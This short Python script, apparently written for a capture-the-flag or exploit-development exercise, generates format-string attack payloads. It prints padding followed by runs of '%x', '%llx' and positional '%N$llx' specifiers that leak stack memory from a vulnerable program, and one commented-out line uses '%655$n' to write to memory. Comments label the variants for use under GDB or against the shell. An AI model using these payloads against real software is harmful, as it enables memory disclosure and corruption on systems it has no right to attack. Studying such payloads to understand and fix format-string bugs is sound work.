from __future__ import print_function


# print("aaaa" * 2 + "%x" * 100, end="")
# print("aaaa" * 2 + "%655$n", end="")

# print("aaaaaaaa " + "%llx " * 200, end="")

# print("abcdefghABCDEFGH" * 0x50 + " " + ' '.join([("%%%i$llx" % i) for i in range(175, 176)]), end="")  ## GDB

print("abcdefghABCDEFGH" * 0x50 + " " + ' '.join([("%%%i$llx" % i) for i in range(390, 400)]), end="")  ## shell
